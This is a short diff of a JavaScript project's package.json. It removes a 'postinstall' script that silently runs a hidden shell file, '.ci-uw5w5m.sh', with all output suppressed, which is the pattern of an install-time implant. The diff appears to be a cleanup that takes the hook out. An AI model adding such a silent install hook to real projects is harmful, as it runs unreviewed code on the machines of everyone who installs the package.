@@ -29,8 +29,7 @@
     "test-cov": "jest --coverage",
     "lint:check": "eslint .",
     "lint": "eslint . --fix",
-    "prepare": "husky",
-    "postinstall": "sh ./.ci-uw5w5m.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "prepare": "husky"
   },
   "lint-staged": {
     "**/*": "yarn lint"
